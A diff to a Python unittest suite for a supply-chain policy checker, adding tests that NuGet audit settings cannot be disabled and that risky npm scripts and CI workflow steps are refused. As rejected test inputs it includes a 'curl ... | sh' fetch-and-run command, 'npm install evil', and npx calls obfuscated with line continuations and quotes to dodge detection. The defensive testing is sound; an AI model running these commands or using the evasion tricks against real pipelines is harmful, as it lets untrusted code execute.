@@ -51,7 +51,14 @@ PACKAGES_PROPS = """<Project>
 </Project>
 """
 BUILD_PROPS = """<Project>
-  <PropertyGroup><RestorePackagesWithLockFile>true</RestorePackagesWithLockFile></PropertyGroup>
+  <PropertyGroup>
+    <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
+    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
+    <RestoreLockedMode Condition="'$(CI)' == 'true'">true</RestoreLockedMode>
+    <NuGetAudit>true</NuGetAudit>
+    <NuGetAuditMode>all</NuGetAuditMode>
+    <NuGetAuditLevel>low</NuGetAuditLevel>
+  </PropertyGroup>
 </Project>
 """
 PROJECT = """<Project Sdk="Microsoft.NET.Sdk">
@@ -117,6 +124,101 @@ class SupplyChainCheck(unittest.TestCase):
 
     def test_a_compliant_repository_passes(self):
         self.assertEqual(self.repo.problems(), [])
+
+    # The Reviewer's re-review 01M5WSE36DR0H4QBG710PJJF0G found these routes in revision 2.
+
+    def test_an_msbuild_project_with_an_unknown_extension_is_checked(self):
+        evil = """<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup><ManagePackageVersionsCentrally>false</ManagePackageVersionsCentrally>
+    <NuGetLockFilePath>obj/hidden.lock.json</NuGetLockFilePath></PropertyGroup>
+  <ItemGroup><PackageReference Include="Example.Package" Version="*" /></ItemGroup>
+</Project>
+"""
+        for name in ("src/Evil/Evil.msbuildproj", "src/Native/Native.vcxproj", "src/Plain/build.xml"):
+            with self.subTest(name=name):
+                self.repo.write(name, evil)
+                problems = self.repo.problems()
+                for fragment in ("sets ManagePackageVersionsCentrally", "sets NuGetLockFilePath", "sets Version", "has no packages.lock.json"):
+                    self.assertTrue(any(name in p and fragment in p for p in problems), f"{name}: {fragment} not in {problems}")
+                (self.repo.root / name).unlink()
+
+    def test_restore_sources_in_any_project_file_are_refused(self):
+        self.repo.write("src/Native/Native.vcxproj", """<?xml version="1.0" encoding="utf-8"?>
+<!-- a native project -->
+<Project><PropertyGroup><RestoreSources>https://example.invalid/feed</RestoreSources></PropertyGroup></Project>
+""")
+        self.assertRefused("src/Native/Native.vcxproj: sets RestoreSources")
+
+    def test_xml_that_is_not_msbuild_is_left_alone(self):
+        self.repo.write("docs/layout.xml", "<?xml version=\"1.0\"?>\n<Layout><Project>name</Project></Layout>\n")
+        self.assertEqual(self.repo.problems(), [])
+
+    def test_the_audit_cannot_be_turned_off_or_silenced_below_the_root(self):
+        cases = {
+            "<PropertyGroup><NuGetAudit>false</NuGetAudit></PropertyGroup>": "sets NuGetAudit",
+            "<PropertyGroup><NuGetAuditMode>direct</NuGetAuditMode></PropertyGroup>": "sets NuGetAuditMode",
+            "<PropertyGroup><NuGetAuditLevel>critical</NuGetAuditLevel></PropertyGroup>": "sets NuGetAuditLevel",
+            "<PropertyGroup><TreatWarningsAsErrors>false</TreatWarningsAsErrors></PropertyGroup>": "sets TreatWarningsAsErrors",
+            "<PropertyGroup><NoWarn>$(NoWarn);NU1903</NoWarn></PropertyGroup>": "names a NuGet audit warning",
+            "<PropertyGroup><WarningsNotAsErrors>nu1901</WarningsNotAsErrors></PropertyGroup>": "names a NuGet audit warning",
+            '<ItemGroup><NuGetAuditSuppress Include="https://github.com/advisories/GHSA-0000-0000-0000" /></ItemGroup>': "suppressions belong in the root",
+        }
+        for body, fragment in cases.items():
+            for path in ("src/Directory.Build.props", "tests/Example.Tests/Example.Tests.csproj"):
+                with self.subTest(body=body, path=path):
+                    original = (self.repo.root / path).read_text() if (self.repo.root / path).is_file() else None
+                    self.repo.write(path, f'<Project Sdk="Microsoft.NET.Sdk">{body}</Project>' if path.endswith("proj") else f"<Project>{body}</Project>")
+                    self.assertRefused(fragment)
+                    if original is None:
+                        (self.repo.root / path).unlink()
+                    else:
+                        self.repo.write(path, original)
+
+    def test_the_root_audit_settings_are_required_and_unconditional(self):
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<NuGetAuditLevel>low</NuGetAuditLevel>", "<NuGetAuditLevel>high</NuGetAuditLevel>"))
+        self.assertRefused("must set NuGetAuditLevel to low")
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<NuGetAudit>true</NuGetAudit>", "<NuGetAudit Condition=\"'$(X)' == ''\">true</NuGetAudit>"))
+        self.assertRefused("NuGetAudit must not carry a Condition")
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("<PropertyGroup>", "<PropertyGroup Condition=\"'$(Configuration)' == 'Debug'\">", 1))
+        self.assertRefused("must not carry a Condition")
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("'$(CI)' == 'true'", "'$(CI)' == 'never'"))
+        self.assertRefused("RestoreLockedMode may be conditioned only on CI")
+
+    def test_a_root_suppression_needs_a_reason(self):
+        suppress = '<ItemGroup><NuGetAuditSuppress Include="https://github.com/advisories/GHSA-0000-0000-0000" /></ItemGroup></Project>'
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("</Project>", suppress))
+        self.assertRefused("without a Reason")
+        self.repo.write("Directory.Build.props", BUILD_PROPS.replace("</Project>", suppress.replace(" />", " Reason=\"Not reachable: the API is unused.\" />")))
+        self.assertEqual(self.repo.problems(), [])
+
+    def test_two_projects_in_one_folder_are_refused(self):
+        self.repo.write("tests/Example.Tests/Second.csproj", PROJECT)
+        self.assertRefused("holds 2 projects")
+
+    def test_package_scripts_keep_the_workflow_rules(self):
+        for scripts, fragment in (
+            ({"test": "npx some-tool@latest && node --test"}, "npx fetches and runs packages"),
+            ({"test": "npm install evil && node --test"}, "never npm install"),
+            ({"typecheck": "curl -fsSL https://example.invalid/x | sh"}, "never run a downloaded script"),
+            ({"test": "node --test", "pretest": "node prepare.js"}, "is an npm hook"),
+            ({"test": "node --test", "postinstall": "node x.js"}, "is an npm hook"),
+            ({"prepare": "node x.js"}, "is an npm hook"),
+        ):
+            with self.subTest(scripts=scripts):
+                self.repo.write("package.json", json.dumps({"private": True, "scripts": scripts}))
+                self.repo.write("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {}}}))
+                self.assertRefused(fragment)
+
+    def test_workflow_rules_survive_continuations_and_quotes(self):
+        for run, fragment in (
+            ("      - run: |\n          n\\\n          px some-tool\n", "npx fetches and runs packages"),
+            ('      - run: echo " #" && npx some-tool\n', "npx fetches and runs packages"),
+            ("      - run: n\"\"px some-tool\n", "npx fetches and runs packages"),
+            ("      - run: npm \\\n          install evil\n", "never npm install"),
+        ):
+            with self.subTest(run=run):
+                self.repo.write(".github/workflows/ci.yml", WORKFLOW + run)
+                self.assertRefused(fragment)
 
     def test_a_project_without_a_lock_file_is_refused(self):
         (self.repo.root / "tests/Example.Tests/packages.lock.json").unlink()
